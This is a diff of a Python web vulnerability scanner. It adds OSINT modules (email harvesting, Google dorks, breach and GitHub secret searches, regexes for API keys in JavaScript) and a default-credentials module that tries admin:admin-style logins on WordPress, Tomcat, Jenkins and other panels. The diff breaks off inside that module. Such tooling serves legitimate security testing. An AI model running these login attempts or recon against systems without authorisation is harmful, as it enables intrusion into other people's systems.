@@ -27,7 +27,7 @@ except ImportError:
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-VERSION    = "11.2"
+VERSION    = "11.4"
 TOOL_NAME  = "WebScan Pro"
 UA         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
 TIMEOUT    = 7
@@ -296,6 +296,27 @@ CAT_META = {
         "biz":"DOM-based XSS occurs entirely in the browser — the payload never touches the server. Attackers use URL fragments, postMessage, or other browser APIs to inject malicious scripts that steal sessions and data."},
     "ip_info":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":0.0,
         "biz":"IP and geolocation information reveals hosting infrastructure details useful in targeted attacks."},
+    # Phase 1 OSINT — v11.3
+    "osint_email":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":5.3,
+        "biz":"Exposed email addresses enable targeted phishing, credential stuffing, and social engineering attacks against staff and administrators."},
+    "osint_dns":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-16","cvss":7.5,
+        "biz":"Missing DMARC/SPF/DKIM records allow attackers to send spoofed emails from your domain — enabling highly credible phishing campaigns that bypass spam filters."},
+    "osint_dorks":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":0.0,
+        "biz":"Google dorks reveal files, login panels, error pages, and sensitive paths indexed by search engines and accessible to any attacker without authentication."},
+    "osint_breach":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-359","cvss":8.1,
+        "biz":"Previously breached credentials may still be in active use. Attackers use breach databases to perform credential stuffing against your login endpoints."},
+    "osint_github":{"owasp":"A02:2021","owasp_name":"Cryptographic Failures","cwe":"CWE-312","cvss":9.0,
+        "biz":"Hardcoded API keys, passwords, and tokens in public repositories give attackers direct access to cloud infrastructure, databases, and third-party services without any hacking required."},
+    "osint_js":{"owasp":"A02:2021","owasp_name":"Cryptographic Failures","cwe":"CWE-312","cvss":7.5,
+        "biz":"JavaScript files often contain hardcoded API keys, internal endpoint URLs, and authentication tokens that are visible to anyone who views your page source."},
+    "default_creds":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-521","cvss":9.8,
+        "biz":"Default or weak credentials on admin panels give attackers immediate full access to the application, server, and database without any exploitation required."},
+    "srv_hardening":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-16","cvss":7.5,
+        "biz":"Exposed server internals, CGI vulnerabilities, WebDAV, and backup files allow attackers to enumerate technology stack, upload files, or execute remote commands."},
+    "info_disclosure":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":5.3,
+        "biz":"Internal IP addresses, stack traces, debug output, and sensitive comments in HTML reduce attacker effort significantly by revealing internal architecture and credentials."},
+    "zap_passive":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-16","cvss":4.3,
+        "biz":"Insecure form actions, missing cache headers, autocomplete on passwords, and mixed content create attack surfaces for credential theft, cache poisoning, and downgrade attacks."},
 }
 
 CAT_TITLES = {
@@ -349,6 +370,17 @@ CAT_TITLES = {
     "dep_confusion":("📦","Dependency Confusion"),
     "dom_xss":     ("🧨", "DOM-based XSS"),
     "ip_info":     ("🌍", "IP Info"),
+    # Phase 1 OSINT — v11.3
+    "osint_email": ("📧", "OSINT — Email Harvest"),
+    "osint_dns":   ("🔎", "OSINT — DNS Intelligence"),
+    "osint_dorks": ("🔍", "OSINT — Google Dorks"),
+    "osint_breach":("💥", "OSINT — Data Breach"),
+    "osint_github":("🐙", "OSINT — GitHub Exposure"),
+    "osint_js":    ("📜", "OSINT — JS Secrets"),
+    "default_creds":  ("🔑", "Default Credentials"),
+    "srv_hardening":  ("🔩", "Server Hardening & CGI"),
+    "info_disclosure":("📰", "Information Disclosure"),
+    "zap_passive":    ("🔬", "ZAP-style Passive Analysis"),
 }
 
 # ─── Terminal UI ───────────────────────────────────────────────────
@@ -538,7 +570,7 @@ def banner():
 """+Style.RESET_ALL)
     print(f"  {Fore.WHITE}{'─'*68}{Style.RESET_ALL}")
     print(f"  {Fore.CYAN}  Professional Web Security Scanner{Style.RESET_ALL}  {Fore.YELLOW}v{VERSION}{Style.RESET_ALL}")
-    print(f"  {Fore.WHITE}  47 Modules  |  CVSS v3.1 · OWASP · CWE  |  PDF · Burp XML · CVE Reports{Style.RESET_ALL}")
+    print(f"  {Fore.WHITE}  57 Modules  |  CVSS v3.1 · OWASP · CWE  |  PDF · Burp XML · CVE Reports{Style.RESET_ALL}")
     print(f"  {Fore.WHITE}{'─'*68}{Style.RESET_ALL}\n")
 
 # ═══ MODULE 0 — WAF DETECTION (v9.0: 30+ signatures) ════════════
@@ -762,6 +794,440 @@ def subdomain_enum(domain, wordlist=None):
         info("No subdomains found")
     _module_done("subdomains")
     return found
+
+# ═══ OSINT MODULE 48 — EMAIL HARVEST ════════════════════════════════
+def osint_email_harvest(domain):
+    if _module_skip("osint_email"): info("Skipping OSINT Email (already done)"); return
+    section("OSINT MODULE 48 — EMAIL HARVEST","📧")
+
+    emails = set()
+
+    # 1. crt.sh — SSL certificate transparency logs often contain email addresses
+    try:
+        r = rget(f"https://crt.sh/?q=%.{domain}&output=json", timeout=10)
+        if r.status_code == 200:
+            for entry in r.json()[:200]:
+                name = entry.get("name_value","")
+                for part in name.split("\n"):
+                    part = part.strip()
+                    if "@" in part and domain in part and " " not in part:
+                        emails.add(part.lower())
+    except Exception: pass
+
+    # 2. security.txt — official contact disclosure
+    for path in ["/.well-known/security.txt", "/security.txt"]:
+        try:
+            r = rget(f"https://{domain}{path}", timeout=5)
+            if r.status_code == 200:
+                for line in r.text.splitlines():
+                    line = line.strip()
+                    if line.lower().startswith("contact:") and "@" in line:
+                        email = line.split(":", 1)[1].strip()
+                        if "@" in email:
+                            emails.add(email.lower())
+                            good(f"security.txt contact: {email}")
+        except Exception: pass
+
+    # 3. HTML source — mailto: links on homepage
+    try:
+        r = rget(f"https://{domain}", timeout=TIMEOUT)
+        found_mailto = re.findall(r'mailto:([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})', r.text)
+        for em in found_mailto:
+            if domain in em or True:   # collect any exposed email
+                emails.add(em.lower())
+    except Exception: pass
+
+    # 4. robots.txt — sometimes has webmaster email in comments
+    try:
+        r = rget(f"https://{domain}/robots.txt", timeout=5)
+        if r.status_code == 200:
+            found_rb = re.findall(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}', r.text)
+            for em in found_rb:
+                emails.add(em.lower())
+    except Exception: pass
+
+    if emails:
+        for em in sorted(emails):
+            good(f"Email found: {em}")
+        add("osint_email", {
+            "severity": "Info",
+            "title": f"Email Addresses Harvested ({len(emails)} found)",
+            "description": f"Publicly exposed email addresses for {domain}: {', '.join(sorted(emails))}",
+            "recommendation": "Avoid exposing internal emails in certificates, source code, and robots.txt. Use role-based emails (security@, abuse@) only where required.",
+            "emails": sorted(emails),
+        })
+    else:
+        good("No email addresses found in public sources")
+    _module_done("osint_email")
+
+
+# ═══ OSINT MODULE 49 — DNS INTELLIGENCE ═════════════════════════════
+def osint_dns_intel(domain):
+    if _module_skip("osint_dns"): info("Skipping OSINT DNS Intel (already done)"); return
+    section("OSINT MODULE 49 — DNS INTELLIGENCE","🔎")
+
+    findings = []
+
+    def _dns_txt(name):
+        """Return list of TXT record strings for a domain name."""
+        try:
+            import dns.resolver as _dr
+            answers = _dr.resolve(name, "TXT")
+            return [b.decode() for rdata in answers for b in rdata.strings]
+        except Exception:
+            try:
+                # Fallback: use socket-based query via system DNS
+                result = subprocess.run(
+                    ["dig", "+short", "TXT", name],
+                    capture_output=True, text=True, timeout=5)
+                return [l.strip().strip('"') for l in result.stdout.splitlines() if l.strip()]
+            except Exception:
+                return []
+
+    # SPF check
+    spf_records = [r for r in _dns_txt(domain) if r.lower().startswith("v=spf1")]
+    if not spf_records:
+        warn("SPF record MISSING — email spoofing possible")
+        findings.append({
+            "severity": "High",
+            "title": "Missing SPF Record — Email Spoofing Risk",
+            "description": f"No SPF TXT record found for {domain}. Attackers can send spoofed emails appearing to come from @{domain}.",
+            "recommendation": "Add SPF record: 'v=spf1 include:_spf.yourmailprovider.com ~all'",
+        })
+    else:
+        good(f"SPF found: {spf_records[0][:80]}")
+        spf_val = spf_records[0]
+        if spf_val.strip().endswith("+all"):
+            vuln("SPF ends with +all — allows ANYONE to send as this domain!", "Critical")
+            findings.append({
+                "severity": "Critical",
+                "title": "SPF +all — Unrestricted Email Spoofing Allowed",
+                "description": f"SPF record ends with '+all' which explicitly permits any server to send email as @{domain}.",
+                "recommendation": "Change '+all' to '-all' (hard fail) or '~all' (soft fail).",
+            })
+
+    # DMARC check
+    dmarc_records = [r for r in _dns_txt(f"_dmarc.{domain}") if "v=dmarc1" in r.lower()]
+    if not dmarc_records:
+        warn("DMARC record MISSING — phishing risk")
+        findings.append({
+            "severity": "High",
+            "title": "Missing DMARC Record — Phishing Risk",
+            "description": f"No DMARC record at _dmarc.{domain}. Without DMARC, spoofed emails may reach inboxes and are not reported.",
+            "recommendation": "Add DMARC: 'v=DMARC1; p=reject; rua=mailto:dmarc@yourdomain.com'",
+        })
+    else:
+        good(f"DMARC found: {dmarc_records[0][:80]}")
+        if "p=none" in dmarc_records[0].lower():
+            warn("DMARC policy is p=none — monitoring only, no enforcement")
+            findings.append({
+                "severity": "Medium",
+                "title": "DMARC Policy p=none — Not Enforced",
+                "description": "DMARC exists but policy is 'none' — spoofed emails still reach recipients, only reported.",
+                "recommendation": "Upgrade to p=quarantine or p=reject after reviewing DMARC reports.",
+            })
+
+    # MX records
+    try:
+        mx_raw = subprocess.run(["dig", "+short", "MX", domain],
+                                capture_output=True, text=True, timeout=5).stdout.strip()
+        if mx_raw:
+            good(f"MX records: {mx_raw[:120]}")
+            if any(x in mx_raw.lower() for x in ["google","gmail","outlook","microsoft","sendgrid","mailgun"]):
+                info(f"Mail provider: third-party (from MX records)")
+        else:
+            info("No MX records found")
+    except Exception: pass
+
+    # DKIM check (common selectors)
+    dkim_found = False
+    for selector in ["default","google","mail","smtp","k1","s1","s2","dkim","key1"]:
+        txt = _dns_txt(f"{selector}._domainkey.{domain}")
+        if txt:
+            good(f"DKIM found (selector={selector}): {str(txt[0])[:60]}")
+            dkim_found = True
+            break
+    if not dkim_found:
+        warn("DKIM not found on common selectors — email authenticity not guaranteed")
+        findings.append({
+            "severity": "Low",
+            "title": "DKIM Not Detected on Common Selectors",
+            "description": f"No DKIM record found on common selectors for {domain}. Email signing may not be configured.",
+            "recommendation": "Configure DKIM signing on your mail server and publish the public key as a TXT record.",
+        })
+
+    for f in findings:
+        add("osint_dns", f)
+    if not findings:
+        good("DNS security (SPF/DMARC/DKIM) looks properly configured")
+    _module_done("osint_dns")
+
+
+# ═══ OSINT MODULE 50 — GOOGLE DORK GENERATOR ═════════════════════
+def osint_google_dorks(url, domain):
+    if _module_skip("osint_dorks"): info("Skipping OSINT Dorks (already done)"); return
+    section("OSINT MODULE 50 — GOOGLE DORK GENERATOR","🔍")
+
+    dorks = [
+        # Sensitive files
+        f'site:{domain} filetype:env OR filetype:config OR filetype:cfg',
+        f'site:{domain} filetype:sql OR filetype:bak OR filetype:backup',
+        f'site:{domain} filetype:log OR filetype:txt inurl:password',
+        f'site:{domain} filetype:xml OR filetype:json inurl:config',
+        # Admin panels
+        f'site:{domain} inurl:admin OR inurl:login OR inurl:dashboard',
+        f'site:{domain} inurl:wp-admin OR inurl:administrator OR inurl:manage',
+        f'site:{domain} inurl:phpmyadmin OR inurl:cpanel OR inurl:webmail',
+        # Exposed files
+        f'site:{domain} intitle:"index of" OR intitle:"directory listing"',
+        f'site:{domain} intitle:"phpinfo" OR inurl:phpinfo.php',
+        f'site:{domain} inurl:.git OR inurl:.svn OR inurl:.env',
+        # API & debug
+        f'site:{domain} inurl:api OR inurl:swagger OR inurl:graphql',
+        f'site:{domain} inurl:debug OR inurl:test OR inurl:dev',
+        # Error pages (info disclosure)
+        f'site:{domain} intext:"sql syntax" OR intext:"mysql_fetch"',
+        f'site:{domain} intext:"Warning: include" OR intext:"Fatal error"',
+        # Sensitive documents
+        f'site:{domain} filetype:pdf OR filetype:doc OR filetype:xls inurl:confidential',
+        f'site:{domain} intext:"password" OR intext:"username" filetype:txt',
+    ]
+
+    info(f"Generated {len(dorks)} Google dorks for {domain}")
+    for d in dorks:
+        good(f"Dork: {d}")
+
+    add("osint_dorks", {
+        "severity": "Info",
+        "title": f"Google Dorks Generated — {len(dorks)} Queries",
+        "description": f"Use these dorks manually in Google to find exposed files, admin panels, and sensitive paths indexed for {domain}.",
+        "recommendation": "Review search engine-indexed content. Use robots.txt and X-Robots-Tag to restrict indexing of sensitive paths. Request removal of sensitive indexed content via Google Search Console.",
+        "dorks": dorks,
+    })
+    _module_done("osint_dorks")
+
+
+# ═══ OSINT MODULE 51 — DATA BREACH CHECK ═════════════════════════
+def osint_breach_check(domain):
+    if _module_skip("osint_breach"): info("Skipping OSINT Breach (already done)"); return
+    section("OSINT MODULE 51 — DATA BREACH CHECK","💥")
+
+    # HIBP domain breach check (free, no API key required for domain search)
+    try:
+        r = rget(
+            f"https://haveibeenpwned.com/api/v3/breacheddomain/{domain}",
+            timeout=10,
+        )
+        if r.status_code == 200:
+            breaches = r.json() if r.headers.get("content-type","").startswith("application/json") else []
+            if isinstance(breaches, list) and breaches:
+                vuln(f"Domain found in {len(breaches)} data breach(es)!", "High")
+                for b in breaches[:5]:
+                    if isinstance(b, dict):
+                        good(f"Breach: {b.get('Name','?')} ({b.get('BreachDate','?')}) — {b.get('DataClasses',[])}".replace("[","").replace("]",""))
+                add("osint_breach", {
+                    "severity": "High",
+                    "title": f"Domain Found in {len(breaches)} Data Breach(es)",
+                    "description": f"{domain} has been found in public data breach databases. Exposed data may include passwords, emails, and personal information still in active use.",
+                    "recommendation": "Force password resets for all accounts. Enable MFA. Monitor for credential stuffing attempts on login endpoints.",
+                    "breaches": [b.get("Name","?") if isinstance(b, dict) else str(b) for b in breaches[:10]],
+                })
+                return
+        elif r.status_code == 404:
+            good(f"Domain not found in HIBP breach database")
+        elif r.status_code == 429:
+            warn("HIBP rate limited — try again in 60s")
+        else:
+            info(f"HIBP returned HTTP {r.status_code}")
+    except Exception as e:
+        info(f"Breach check unavailable: {e}")
+
+    # Paste check — look for domain mentions in public pastes (Pastebin etc.)
+    try:
+        r2 = rget(f"https://psbdmp.cc/api/search/{domain}", timeout=8)
+        if r2.status_code == 200:
+            data = r2.json()
+            if isinstance(data, dict):
+                count = data.get("count", 0)
+                if count and int(count) > 0:
+                    warn(f"Domain found in {count} public paste(s) — may contain leaked data")
+                    add("osint_breach", {
+                        "severity": "Medium",
+                        "title": f"Domain Found in {count} Public Paste(s)",
+                        "description": f"{domain} appears in {count} public paste entries. This may indicate leaked credentials, internal data, or configuration details.",
+                        "recommendation": "Review exposed pastes. Monitor paste sites for domain leaks using automated alerts.",
+                    })
+                else:
+                    good("Domain not found in public pastes")
+    except Exception: pass
+
+    _module_done("osint_breach")
+
+
+# ═══ OSINT MODULE 52 — GITHUB EXPOSURE ═══════════════════════════
+def osint_github_exposure(domain):
+    if _module_skip("osint_github"): info("Skipping OSINT GitHub (already done)"); return
+    section("OSINT MODULE 52 — GITHUB EXPOSURE","🐙")
+
+    # GitHub code search API (unauthenticated — 10 req/min, sufficient for a few queries)
+    GITHUB_QUERIES = [
+        f'"{domain}" password',
+        f'"{domain}" api_key OR secret_key OR api_secret',
+        f'"{domain}" .env',
+        f'"{domain}" db_password OR database_password',
+    ]
+
+    exposed_items = []
+    for query in GITHUB_QUERIES:
+        try:
+            resp = _sess.get(
+                "https://api.github.com/search/code",
+                params={"q": query, "per_page": 5},
+                headers={"Accept": "application/vnd.github+json",
+                         "User-Agent": UA},
+                timeout=10,
+            )
+            if resp.status_code == 200:
+                items = resp.json().get("items", [])
+                for item in items:
+                    repo = item.get("repository", {}).get("full_name", "?")
+                    file_path = item.get("path", "?")
+                    html_url = item.get("html_url", "")
+                    exposed_items.append({"repo": repo, "file": file_path, "url": html_url, "query": query})
+                    vuln(f"GitHub exposure: {repo}/{file_path}", "Critical")
+            elif resp.status_code == 403:
+                warn("GitHub API rate limit reached — try with token: export GITHUB_TOKEN=...")
+                break
+            elif resp.status_code == 422:
+                info(f"GitHub search skipped for query (validation error)")
+            time.sleep(0.5)   # respect GitHub rate limit
+        except Exception: pass
+
+    if exposed_items:
+        add("osint_github", {
+            "severity": "Critical",
+            "title": f"Sensitive Data Exposed on GitHub ({len(exposed_items)} result(s))",
+            "description": f"Public GitHub repositories contain files referencing {domain} with potentially sensitive data (passwords, API keys, .env files).",
+            "recommendation": "Immediately rotate any exposed credentials. Remove sensitive files from repos using git history rewrite (BFG Repo Cleaner). Set repos to private. Use GitHub Secret Scanning alerts.",
+            "items": [f"{i['repo']}/{i['file']}" for i in exposed_items[:10]],
+        })
+    else:
+        good("No obvious GitHub exposure found (unauthenticated search — limited coverage)")
+    _module_done("osint_github")
+
+
+# ═══ OSINT MODULE 53 — JS FILE SECRETS ══════════════════════════
+def osint_js_secrets(url):
+    if _module_skip("osint_js"): info("Skipping OSINT JS Secrets (already done)"); return
+    section("OSINT MODULE 53 — JAVASCRIPT SECRETS SCAN","📜")
+
+    # Patterns that commonly indicate secrets in JS
+    SECRET_PATTERNS = [
+        (r'api[_\-]?key\s*[=:]\s*["\']([A-Za-z0-9\-_]{16,})["\']',      "API Key"),
+        (r'secret[_\-]?key\s*[=:]\s*["\']([A-Za-z0-9\-_]{16,})["\']',   "Secret Key"),
+        (r'access[_\-]?token\s*[=:]\s*["\']([A-Za-z0-9\-_]{16,})["\']', "Access Token"),
+        (r'auth[_\-]?token\s*[=:]\s*["\']([A-Za-z0-9\-_]{16,})["\']',   "Auth Token"),
+        (r'password\s*[=:]\s*["\']([^"\']{6,})["\']',                     "Hardcoded Password"),
+        (r'db[_\-]?pass(?:word)?\s*[=:]\s*["\']([^"\']{4,})["\']',       "DB Password"),
+        (r'(AKIA[0-9A-Z]{16})',                                            "AWS Access Key"),
+        (r'(AIza[0-9A-Za-z\-_]{35})',                                     "Google API Key"),
+        (r'(ghp_[A-Za-z0-9]{36})',                                        "GitHub Token"),
+        (r'(sk-[A-Za-z0-9]{32,})',                                        "OpenAI Key"),
+        (r'(xox[baprs]-[A-Za-z0-9\-]+)',                                  "Slack Token"),
+        (r'(https?://[a-zA-Z0-9]+:[a-zA-Z0-9]+@)',                        "Credentials in URL"),
+    ]
+
+    # Endpoint patterns for API discovery
+    ENDPOINT_PATTERNS = [
+        r'["\'](/api/v[0-9]/[a-zA-Z0-9_/\-]+)["\']',
+        r'["\'](/[a-zA-Z0-9_]+/[a-zA-Z0-9_]+\.php)["\']',
+        r'fetch\(["\'](/[a-zA-Z0-9_/\-]+)["\']',
+        r'axios\.[a-z]+\(["\'](/[a-zA-Z0-9_/\-]+)["\']',
+    ]
+
+    # Collect JS file URLs from main page
+    js_urls = set()
+    try:
+        r = rget(url, timeout=TIMEOUT)
+        # Find <script src="..."> tags
+        for m in re.finditer(r'<script[^>]+src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', r.text, re.I):
+            src = m.group(1)
+            if src.startswith("http"):
+                js_urls.add(src)
+            elif src.startswith("//"):
+                js_urls.add("https:" + src)
+            else:
+                parsed_url = urlparse(url)
+                base = f"{parsed_url.scheme}://{parsed_url.netloc}"
+                js_urls.add(urljoin(base, src))
+        # Also look for webpack chunks, bundle files
+        for m in re.finditer(r'["\']([/][a-zA-Z0-9_/.\-]+(?:chunk|bundle|main|app)[^"\']*\.js)["\']', r.text, re.I):
+            parsed_url = urlparse(url)
+            base = f"{parsed_url.scheme}://{parsed_url.netloc}"
+            js_urls.add(urljoin(base, m.group(1)))
+    except Exception: pass
+
+    info(f"Found {len(js_urls)} JS files to scan")
+    if not js_urls:
+        good("No JS files found to scan")
+        _module_done("osint_js"); return
+
+    all_secrets = []
+    all_endpoints = set()
+
+    def _scan_js(js_url):
+        try:
+            rj = rget(js_url, timeout=TIMEOUT)
+            if rj.status_code != 200: return
+            content = rj.text
+            # Size guard — skip huge minified bundles (>500KB)
+            if len(content) > 500_000:
+                content = content[:500_000]
+            # Secret scan
+            for pattern, label in SECRET_PATTERNS:
+                for match in re.finditer(pattern, content, re.I):
+                    val = match.group(1) if match.lastindex else match.group(0)
+                    # Filter obvious test/placeholder values
+                    if val.lower() in ("your_api_key","placeholder","example","undefined","null","xxxx","changeme"):
+                        continue
+                    with _lock:
+                        all_secrets.append({"type": label, "value": val[:60], "file": js_url})
+                    vuln(f"JS Secret [{label}] in {js_url.split('/')[-1]}: {val[:40]}...", "Critical")
+            # Endpoint discovery
+            for ep_pat in ENDPOINT_PATTERNS:
+                for match in re.finditer(ep_pat, content):
+                    ep = match.group(1)
+                    if len(ep) > 3:
+                        with _lock:
+                            all_endpoints.add(ep)
+        except Exception: pass
+
+    with ThreadPoolExecutor(max_workers=min(len(js_urls), 8)) as ex:
+        futs = [ex.submit(_scan_js, j) for j in list(js_urls)[:20]]
+        for f in as_completed(futs): _pass(f)
+
+    if all_secrets:
+        add("osint_js", {
+            "severity": "Critical",
+            "title": f"Secrets Found in JavaScript Files ({len(all_secrets)} item(s))",
+            "description": f"{len(all_secrets)} potential secret(s) detected in publicly loaded JS files: {', '.join(set(s['type'] for s in all_secrets))}.",
+            "recommendation": "Never hardcode secrets in client-side JavaScript. Use environment variables server-side. Rotate all exposed credentials immediately. Implement secret scanning in CI/CD pipeline.",
+            "secrets": [f"{s['type']}: {s['value']}" for s in all_secrets[:10]],
+        })
+    else:
+        good("No obvious secrets found in JS files")
+
+    if all_endpoints:
+        info(f"JS API endpoints discovered: {len(all_endpoints)}")
+        add("osint_js", {
+            "severity": "Info",
+            "title": f"API Endpoints Discovered in JavaScript ({len(all_endpoints)} path(s))",
+            "description": f"JavaScript analysis revealed {len(all_endpoints)} internal API endpoint path(s).",
+            "recommendation": "Ensure all discovered API endpoints require authentication and have proper authorization checks.",
+            "endpoints": sorted(all_endpoints)[:30],
+        })
+    _module_done("osint_js")
+
 
 # ═══ MODULE 4 — SECURITY HEADERS (v9.0: +3 headers: COOP, COEP, NEL) ═
 def check_headers(url, out_dir="./reports"):
@@ -3152,6 +3618,20 @@ def main():
         else:
             info("Subdomain enum skipped (--no-subs)")
 
+    # ── PHASE 1b: OSINT — all 6 modules parallel ───────────────────
+    section("PHASE 1b — OSINT INTELLIGENCE","🔎")
+    _osint_tasks = [
+        lambda: _run(osint_email_harvest, domain),
+        lambda: _run(osint_dns_intel, domain),
+        lambda: _run(osint_google_dorks, url, domain),
+        lambda: _run(osint_breach_check, domain),
+        lambda: _run(osint_github_exposure, domain),
+        lambda: _run(osint_js_secrets, url),
+    ]
+    with ThreadPoolExecutor(max_workers=6) as _po:
+        _fosint = [_po.submit(t) for t in _osint_tasks]
+        for _f in as_completed(_fosint): _pass(_f)
+
     # ── PHASE 2: WEB / API — all modules parallel ──────────────────
     section("PHASE 2 — WEB APPLICATION ANALYSIS","🕵")
     _p2_tasks = [
@@ -3212,8 +3692,20 @@ def main():
         with ThreadPoolExecutor(max_workers=8) as _p2b:
             _futs2b = [_p2b.submit(t) for t in _p2b_tasks]
             for _f in as_completed(_futs2b): _pass(_f)
+
+        # ── PHASE 2d: NIKTO/ZAP-STYLE (54–57) ─────────────────────
+        section("PHASE 2d — NIKTO/ZAP-STYLE CHECKS (54–57)","🔍")
+        _p2d_tasks = [
+            lambda: _run(default_creds_scan, url),
+            lambda: _run(server_hardening_scan, url),
+            lambda: _run(info_disclosure_scan, url),
+            lambda: _run(zap_passive_scan, url),
+        ]
+        with ThreadPoolExecutor(max_workers=4) as _p2d:
+            _futs2d = [_p2d.submit(t) for t in _p2d_tasks]
+            for _f in as_completed(_futs2d): _pass(_f)
     else:
-        info("Skipping Phase 2b+2c advanced modules (--no-advanced)")
+        info("Skipping Phase 2b+2c+2d advanced modules (--no-advanced)")
 
     # ── PHASE 3: REPORTS ───────────────────────────────────────────
     section("PHASE 3 — REPORT GENERATION","📊")
@@ -4897,6 +5389,641 @@ def dom_xss_scan(url):
         pass
 
     _module_done("dom_xss")
+
+
+# ═══ MODULE 54 — DEFAULT CREDENTIALS SCANNER ════════════════════
+def default_creds_scan(url):
+    if _module_skip("default_creds"): info("Skipping Default Creds (already done)"); return
+    section("MODULE 54 — DEFAULT CREDENTIALS SCANNER","🔑")
+
+    parsed = urlparse(url)
+    base = f"{parsed.scheme}://{parsed.netloc}"
+
+    # (path, method, cred_pairs, success_indicator, app_name)
+    TARGETS = [
+        # WordPress
+        ("/wp-login.php", "POST",
+         [("log=admin&pwd=admin&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
+           "admin", "admin"),
+          ("log=admin&pwd=password&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
+           "admin", "password"),
+          ("log=admin&pwd=123456&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
+           "admin", "123456")],
+         ["Dashboard", "wp-admin", "Howdy"], "WordPress"),
+
+        # Apache Tomcat Manager
+        ("/manager/html", "BASIC",
+         [("tomcat", "tomcat"), ("admin", "admin"), ("admin", "s3cret"),
+          ("tomcat", "s3cret"), ("admin", "password"), ("manager", "manager")],
+         ["Tomcat Web Application Manager", "Applications"], "Apache Tomcat"),
+
+        # Jenkins — probe /login (200/302), POST to /j_spring_security_check
+        ("/login", "JENKINS",
+         [("j_username=admin&j_password=admin&from=%2F&Submit=Sign+in",
+           "admin", "admin"),
+          ("j_username=admin&j_password=password&from=%2F&Submit=Sign+in",
+           "admin", "password")],
+         ["Dashboard", "Jenkins", "Build History"], "Jenkins"),
+
+        # Grafana — uses JSON API, not form POST
+        ("/api/login", "JSON",
+         [('{"user":"admin","password":"admin"}', "admin", "admin"),
+          ('{"user":"admin","password":"grafana"}', "admin", "grafana"),
+          ('{"user":"admin","password":"Admin1234!"}', "admin", "Admin1234!")],
+         ["\"message\":\"Logged in\"", "tokenId", "grafana_session"], "Grafana"),
+
+        # phpMyAdmin — presence detection only (empty indicators = presence-only mode)
+        # Post-login content (pma_navigation etc.) checked separately to avoid false positives
+        ("/phpmyadmin/", "GET", [], [], "phpMyAdmin"),
+        ("/phpmyadmin/index.php", "GET", [], [], "phpMyAdmin"),
+
+        # Joomla
+        ("/administrator/", "POST",
+         [("username=admin&passwd=admin&option=com_login&task=login",
+           "admin", "admin")],
+         ["Joomla", "Control Panel", "mod_login"], "Joomla"),
+
+        # Webmin
+        ("/session_login.cgi", "POST",
+         [("user=root&pass=root", "root", "root"),
+          ("user=admin&pass=admin", "admin", "admin")],
+         ["Webmin", "index.cgi", "System Information"], "Webmin"),
+
+        # cPanel
+        ("/login/?login_only=1", "POST",
+         [("user=admin&pass=admin", "admin", "admin")],
+         ["cPanel", "WHM", "cpanel_session"], "cPanel"),
+    ]
+
+    found_any = False
+
+    for path, method, creds, indicators, app_name in TARGETS:
+        target_url = base + path
+
+        # Probe: check if path exists. For POST/JSON/BASIC targets a GET probe may return
+        # 302 (redirect to login) or 405 (Method Not Allowed) — both mean the path exists.
+        # Allow 200, 302, 401, 403, 405 as "path exists" signals.
+        try:
+            probe = rget(target_url, timeout=TIMEOUT, allow_redirects=False)
+            if probe.status_code not in (200, 302, 301, 401, 403, 405):
+                continue   # path doesn't exist on this server (404, 500, etc.)
+        except Exception:
+            continue
+
+        if method == "GET":
+            # For GET probes, re-fetch with redirects to get actual content
+            try:
+                probe = rget(target_url, timeout=TIMEOUT, allow_redirects=True)
+            except Exception:
+                continue
+            # For empty indicators list — just detect presence (e.g. phpMyAdmin login page)
+            if not indicators:
+                # phpMyAdmin detected — report presence, cannot test no-auth without false positive
+                PMA_LOGIN_INDICATORS = ["phpmyadmin", "pma_username", "pmalogo"]
+                if any(ind in probe.text.lower() for ind in PMA_LOGIN_INDICATORS):
+                    info(f"{app_name} detected at {path} — manual auth test recommended")
+                    add("default_creds", {
+                        "severity": "Info",
+                        "title": f"{app_name} Admin Panel Detected at {path}",
+                        "description": f"{app_name} login interface found at {target_url}. Automated credential testing skipped to avoid false positives — test manually.",
+                        "recommendation": f"Ensure {app_name} requires strong credentials. Restrict access by IP. Disable {app_name} in production if not needed.",
+                        "url": target_url,
+                    })
+                continue
+            # Check if already accessible (no auth required) — post-login indicators only
+            if any(ind.lower() in probe.text.lower() for ind in indicators):
+                vuln(f"{app_name} admin panel accessible without authentication: {path}", "Critical")
+                add("default_creds", {
+                    "severity": "Critical",
+                    "title": f"{app_name} Admin Panel Exposed (No Auth)",
+                    "description": f"{app_name} administration interface at {target_url} is accessible without any authentication.",
+                    "recommendation": f"Restrict access to {path} via IP whitelist or require authentication.",
+                    "url": target_url,
+                })
+                found_any = True
+            continue
+
+        if method == "BASIC":
+            for user, passwd in creds:
+                try:
+                    r = _sess.get(target_url, auth=(user, passwd), timeout=TIMEOUT)
+                    if r.status_code == 200 and any(ind.lower() in r.text.lower() for ind in indicators):
+                        vuln(f"{app_name} default credentials valid: {user}:{passwd}", "Critical")
+                        add("default_creds", {
+                            "severity": "Critical",
+                            "title": f"{app_name} Default Credentials Work ({user}:{passwd})",
+                            "description": f"HTTP Basic Auth at {target_url} accepted default credentials {user}:{passwd}.",
+                            "recommendation": "Immediately change default credentials. Restrict admin path by IP. Disable remote management if not needed.",
+                            "url": target_url,
+                        })
+                        found_any = True
+                        break
+                except Exception:
+                    pass
+            continue
+
+        if method in ("POST", "JSON", "JENKINS"):
